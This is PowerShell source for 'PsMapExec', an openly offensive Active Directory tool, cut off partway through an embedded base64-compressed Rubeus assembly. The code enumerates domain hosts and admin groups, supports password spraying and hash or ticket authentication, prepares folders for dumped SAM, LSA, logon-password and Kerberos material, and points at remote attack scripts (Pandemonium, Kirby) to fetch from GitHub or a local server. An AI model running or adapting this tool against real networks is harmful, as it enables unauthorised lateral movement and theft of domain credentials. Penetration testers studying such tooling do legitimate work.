Function PsMapExec{


[CmdletBinding()]
Param(
    [Parameter(Mandatory=$False, Position=0, ValueFromPipeline=$true)]
    [String]$Command = '',

    [Parameter(Mandatory=$False, Position=1, ValueFromPipeline=$true)]
    [String]$Targets = '',

    [Parameter(Mandatory=$False, Position=2, ValueFromPipeline=$true)]
    [String]$Domain = "$env:USERDNSDOMAIN",

    [Parameter(Mandatory=$False, Position=3, ValueFromPipeline=$true)]
    [String]$Username = "",

    [Parameter(Mandatory=$True, Position=4, ValueFromPipeline=$true)]
    [String]$Method = "",

    [Parameter(Mandatory=$False, Position=5, ValueFromPipeline=$true)]
    [String]$Module = "",

    [Parameter(Mandatory=$False, Position=6, ValueFromPipeline=$true)]
    [String]$Hash = "",

    [Parameter(Mandatory=$False, Position=7, ValueFromPipeline=$true)]
    [String]$Password = "",

    [Parameter(Mandatory=$False, Position=8, ValueFromPipeline=$true)]
    [String]$AllDomains = "",

    [Parameter(Mandatory=$False, Position=9, ValueFromPipeline=$true)]
    [String]$UserDomain = "",

    [Parameter(Mandatory=$False, Position=10, ValueFromPipeline=$true)]
    [String]$LocalFileServer = "",

    [Parameter(Mandatory=$False, Position=11, ValueFromPipeline=$true)]
    [String]$Threads = "8",

    [Parameter(Mandatory=$False, Position=12, ValueFromPipeline=$true)]
    [switch]$Force,

    [Parameter(Mandatory=$False, Position=13, ValueFromPipeline=$true)]
    [switch]$LocalAuth,
    
    [Parameter(Mandatory=$False, Position=14, ValueFromPipeline=$true)]
    [switch]$CurrentUser,

    [Parameter(Mandatory=$False, Position=15, ValueFromPipeline=$true)]
    [switch]$SuccessOnly,

    [Parameter(Mandatory=$False, Position=16, ValueFromPipeline=$true)]
    [switch]$ShowOutput,

    [Parameter(Mandatory=$False, Position=17, ValueFromPipeline=$true)]
    [String]$Ticket = "",

    [Parameter(Mandatory=$False, Position=18, ValueFromPipeline=$true)]
    [Switch]$AccountAsPassword,

    [Parameter(Mandatory=$False, Position=19, ValueFromPipeline=$true)]
    [Switch]$EmptyPassword,

    [Parameter(Mandatory=$False, Position=20, ValueFromPipeline=$true)]
    [int]$Port = "",

    [Parameter(Mandatory=$False, Position=21, ValueFromPipeline=$true)]
    [Switch]$NoParse
)

# Check for mandatory parameter


$startTime = Get-Date
Set-Variable MaximumHistoryCount 32767

# Set the targets variable if not provided when spraying
if ($Method -eq "Spray" -and $Targets -eq ""){
$Targets = "all"
}

################################################################################################################
###################################### Banner and version information ##########################################
################################################################################################################

$Banner = @("
  _____   _____ __  __          _____  ________   ________ _____ 
 |  __ \ / ____|  \/  |   /\   |  __ \|  ____\ \ / /  ____/ ____|
 | |__) | (___ | \  / |  /  \  | |__) | |__   \ V /| |__ | |     
 |  ___/ \___ \| |\/| | / /\ \ |  ___/|  __|   > < |  __|| |     
 | |     ____) | |  | |/ ____ \| |    | |____ / . \| |___| |____ 
 |_|    |_____/|_|  |_/_/    \_\_|    |______/_/ \_\______\_____|
                                                                 
")

Write-Output $Banner
Write-Host "Github  : "  -NoNewline
Write-Host "https://github.com/The-Viper-One"
Write-Host "Version : " -NoNewline
Write-Host "0.3.9"
Write-Host

# If no targets have been provided
if (-not $Targets -and $Method -ne "Spray") {
    Write-host "[-]  " -ForegroundColor "Red" -NoNewline
    Write-host "You must provide a value for -targets (all, servers, DCs, Workstations)"
    return
}



################################################################################################################
####################################### Some logic based checking ##############################################
################################################################################################################

if ($Threads -lt 2){
        Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Threads value should not be less than 2"
        return
}

if ($Method -eq ""  -and !$SessionHunter -and !$Spray){
        Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "No method specified"
        return
}




if ($Method -eq "RDP" -and $Hash -ne ""){
        Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Hash authentication not currently supported with RDP"
        return
}

if ($CurrentUser -and $Method -eq "RDP"){

        Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "-Username and -Password parameters required when using the method RDP"
        return
}

    if ($CurrentUser) {
        if ($Hash -ne "" -or $Password -ne "" -or $Username -ne "" -or $Ticket -ne "") {
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "The switch -CurrentUser has been provided with a credential parameter ""e.g.: -Username, -Password"""
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "PsMapExec will continue in the current users context """
            Start-Sleep -Seconds 5
        }
    }

if ($Method -eq "Spray"){$CurrentUser = $True}
if ($Method -eq "GenRelayList"){$CurrentUser = $True}

if ($Method -eq "VNC") {
    if ($Username -ne "" -or $Password -ne "" -or $Hash -ne "" -or $Ticket -ne "") {
        $CurrentUser = $True
        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
        Write-Host " Method VNC does not support authentication material, it simply checks if No Auth is enabled."
        Write-Host
        Start-sleep -Seconds 5
    }
 } 



# Check script modules
$InvokeRubeusLoaded = Get-Command -Name "Invoke-Rubeus" -ErrorAction "SilentlyContinue"

################################################################################################################
######################################### External Script variables ############################################
################################################################################################################

$PandemoniumURL = "https://raw.githubusercontent.com/The-Viper-One/PME-Scripts/main/Invoke-Pandemonium.ps1"
$KirbyURL = "https://raw.githubusercontent.com/The-Viper-One/PME-Scripts/main/Kirby.ps1"

# Check if $LocalFileServer is not NULL
if (![string]::IsNullOrEmpty($LocalFileServer)) {
    # Regular expression pattern to validate an IP address
    $ipRegex = '^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$'

    if ($LocalFileServer -match $ipRegex) {
        # Update URLs to use the provided local file server's IP address
        $PandemoniumURL = "http://$LocalFileServer/Invoke-Pandemonium.ps1"
        $KirbyURL = "http://$LocalFileServer/Kirby.ps1"
    }
    else {
        # If $LocalFileServer is not a valid IP address, show an error message and return
        Write-Host "[-] " -ForegroundColor "Red" -NoNewline
        Write-Host "The provided value '$LocalFileServer' is not a valid IP address."
        return
    }
}



################################################################################################################
########################################### Initial Directory Setup ############################################
################################################################################################################

$WorkingDirectory = (Get-Item -Path ".\").FullName

try {
    $testFilePath = Join-Path $WorkingDirectory "Test.PME"
    New-Item -ItemType "File" -Name "Test.PME" -Path $WorkingDirectory -Force -ErrorAction "Stop" | Out-Null
    Remove-Item -Path $testFilePath -Force | Out-Null
} catch {
    Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
    Write-Host "Current directory is not writable, change to a different directory and try again"
    return
}

$PME = Join-Path $WorkingDirectory "PME"
$SAM = Join-Path $PME "SAM"
$MSSQL = Join-Path $PME "MSSQL"
$LogonPasswords = Join-Path $PME "LogonPasswords"
$SMB = Join-Path $PME "SMB"
$Tickets = Join-Path $PME "Tickets"
$KerbDump = Join-Path $Tickets "KerbDump"
$MimiTickets = Join-Path $Tickets "MimiTickets"
$ekeys = Join-Path $PME "eKeys"
$LSA = Join-Path $PME "LSA"
$ConsoleHistory = Join-Path $PME "Console History"
$Sessions = Join-Path "$PME" "Sessions"
$UserFiles = Join-Path "$PME" "User Files"
$Spraying = Join-Path $PME "Spraying"
$VNC = Join-Path $PME "VNC"

  $directories = @(
    $PME, $SAM, $LogonPasswords, $MSSQL, $SMB, $Tickets, $ekeys, 
    $LSA, $KerbDump, $MimiTickets, $ConsoleHistory, $Sessions, 
    $UserFiles, $Spraying, $VNC
)

foreach ($directory in $directories) {
    if (-not (Test-Path $directory)) {
        New-Item -ItemType Directory -Force -Path $directory | Out-Null
        if ($directory -eq $PME) {
            Write-Host "[+] " -ForegroundColor "Green" -NoNewline
            Write-Host "Created directory for PME at $directory"
            Write-Host
            Start-sleep -seconds "3"
        }
    }
}

######### Checks if user context is administrative when a session is spawned #########
$CheckAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

################################################################################################################
########################################## Domain Target Acquisition ###########################################
################################################################################################################


if ($Method -ne "Spray"){
$directoryEntry = [ADSI]"LDAP://$domain"
$searcher = [System.DirectoryServices.DirectorySearcher]$directoryEntry
$searcher.PageSize = 1000
$searcher.PropertiesToLoad.AddRange(@("dnshostname", "operatingSystem"))

if ($Targets -eq "Workstations") {

$searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
$computers = $searcher.FindAll() | Where-Object { $_.Properties["operatingSystem"][0]  -notlike "*windows*server*" -and $_.Properties["dnshostname"][0] -ne "$env:COMPUTERNAME.$env:USERDNSDOMAIN" }

}
elseif ($Targets -eq "Servers") {

$searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
$computers = $searcher.FindAll() | Where-Object { $_.Properties["operatingSystem"][0]  -like "*server*" -and $_.Properties["dnshostname"][0] -ne "$env:COMPUTERNAME.$env:USERDNSDOMAIN" }

}
elseif ($Targets -eq "DC" -or $Targets -eq "DCs" -or $Targets -eq "DomainControllers" -or $Targets -eq "Domain Controllers") {

$searcher.Filter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
$computers = $searcher.FindAll()

}
elseif ($Targets -eq "All" -or $Targets -eq "Everything") {


$searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
$computers = $searcher.FindAll() | Where-Object { $_.Properties["dnshostname"][0] -ne "$env:COMPUTERNAME.$env:USERDNSDOMAIN" }`

}


elseif ($Method -ne "Spray"){
if ($Targets -is [string]) {
    $ipAddress = [System.Net.IPAddress]::TryParse($Targets, [ref]$null)
    if ($ipAddress) {
        Write-Host "IP Addresses not yet supported" -ForegroundColor "Red"
        break
    }
    else {
        
        if ($Targets -notlike "*.*") {
            $Targets = $Targets + "." + $Domain
        }
        
        $computers = $searcher.FindAll() | Where-Object { $_.Properties["dnshostname"][0] -in $Targets }
            
            }
        }
    }
}


# Dispose the searcher after use
$searcher.Dispose()



################################################################################################################
############################ Grab interesting users for various parsing functions ##############################
################################################################################################################

function New-Searcher {
    $directoryEntry = [ADSI]"LDAP://$domain"
    $searcher = [System.DirectoryServices.DirectorySearcher]$directoryEntry
    $searcher.PageSize = 1000
    return $searcher
}

# Fetch enabled users
$searcher = New-Searcher
$searcher.Filter = "(&(objectCategory=user)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2)(!userAccountControl:1.2.840.113556.1.4.803:=16))"
$searcher.PropertiesToLoad.AddRange(@("samAccountName"))

$users = $searcher.FindAll() | Where-Object { $_.Properties["samAccountName"] -ne $null }
$EnabledDomainUsers = $users | ForEach-Object { $_.Properties["samAccountName"][0] }

# Fetch members of a group
function Get-GroupMembers {
    param (
        [Parameter(Mandatory = $true)]
        [string]$GroupName
    )

    $searcher = New-Searcher
    $searcher.Filter = "(&(objectCategory=group)(cn=$GroupName))"
    $searcher.PropertiesToLoad.AddRange(@("member"))
    $groups = $searcher.FindAll()

    $members = @()

    foreach ($group in $groups) {
        $group.Properties["member"] | ForEach-Object {
            $userDN = $_.ToString()
            $user = [ADSI]"LDAP://$userDN"
            $samAccountName = $user.Properties["samaccountname"] -as [array]
            if ($samAccountName) {
                $members += $samAccountName[0]
            }
        }
    }
    
    return $members
}

$DomainAdmins = Get-GroupMembers -GroupName "Domain Admins"
$EnterpriseAdmins = Get-GroupMembers -GroupName "Enterprise Admins" -ErrorAction SilentlyContinue
$ServerOperators = Get-GroupMembers -GroupName "Server Operators" -ErrorAction SilentlyContinue
$AccountOperators = Get-GroupMembers -GroupName "Account Operators" -ErrorAction SilentlyContinue

$FQDNDomainName = $domain.ToLower()
$FQDNDomainPlusDomainAdmins = $DomainAdmins | ForEach-Object { "$FQDNDomainName\$_" }
$FQDNDomainPlusEnterpriseAdmins = $EnterpriseAdmins | ForEach-Object { "$FQDNDomainName\$_" }
$FQDNDomainPlusServerOperators = $ServerOperators | ForEach-Object { "$FQDNDomainName\$_" }
$FQDNDomainPlusAccountOperators = $AccountOperators | ForEach-Object { "$FQDNDomainName\$_" }

if ($Method -eq "Spray") {
    if ($Targets -eq "" -or $Targets -eq "all" -or $Targets -eq "Domain Users") {
        $Targets = $EnabledDomainUsers
    }
    elseif ($Targets -in $EnabledDomainUsers) {
        $EnabledDomainUsers = $Targets
    }
    else {
        $groupMembers = Get-GroupMembers -GroupName $Targets
        if ($groupMembers.Count -gt 0) {
            $EnabledDomainUsers = $groupMembers
        }
        elseif ($groupMembers.Count -eq 0) {
            Write-host "[-] " -ForegroundColor "Red" -NoNewline
            Write-host "Group either does not exist or is empty"
            return
        }
        else {
            Write-host "[-] " -ForegroundColor "Red" -NoNewline
            Write-Host "Unspecified Error"
            return
        }
    }
}




# Grab Computer Accounts for spraying
function Get-ComputerAccounts {
    $searcher = New-Searcher
    $searcher.Filter = "(&(objectClass=computer)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
    $searcher.PropertiesToLoad.Add("samAccountName") | Out-Null
    
    try {
        $ComputerSamAccounts = $searcher.FindAll() | ForEach-Object { $_.Properties["samAccountName"][0] }
        return $ComputerSamAccounts
    } catch {
        Write-Error "Failed to fetch computer accounts. Error: $_"
        return $null
    }
}

$ComputerSamAccounts = Get-ComputerAccounts
$searcher.Dispose()



if (!$LocalAuth){
if ($Method -ne "RDP"){
if (!$Force){
foreach ($EnterpriseAdmin in $EnterpriseAdmins){
        $splitResult = $Username -split [regex]::Escape($EnterpriseAdmin)
        if ($splitResult.Count -gt 1) {
        Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Specified user is a Enterprise Admin. Use the -Force switch to override"
        return
        }
    }
}

if (!$Force) {
    foreach ($DomainAdmin in $DomainAdmins) {
        $splitResult = $Username -split [regex]::Escape($DomainAdmin)
        if ($splitResult.Count -gt 1) {
            Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Specified user is a Domain Admin. Use the -Force switch to override"
            return
            }
        }
    }
}

if (!$CurrentUser) {
    if ($Method -ne "GenRelayList") {
        if ($Method -ne "SessionHunter"){
         if ($Method -ne "Spray"){
        try {
            $directoryEntry = [ADSI]"LDAP://$domain"
            $searcher = [System.DirectoryServices.DirectorySearcher]$directoryEntry
            $searcher.Filter = "(&(objectCategory=user)(samAccountName=$Username))"
            $searcher.PropertiesToLoad.AddRange(@("samAccountName"))
            $user = $searcher.FindOne()
            $domainUser = $user.Properties["samAccountName"]
        }
        Catch {
           
           if ($Ticket -ne $null){} 
            elseif (!$DomainUser) {
                Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
                Write-Host "Specified username is not a valid domain user"
                return
                
                        }
                    }
                }
            }
        }
    }
}



################################################################################################################
################################### Loads ticket functions into memory #########################################
################################################################################################################

if ($InvokeRubeusLoaded.Name -ne "Invoke-Rubeus"){
function Invoke-Rubeus{
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, Mandatory = $true)]
        [ValidateNotNullorEmpty()]
        [String]
        $Command
    )
    $a=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String("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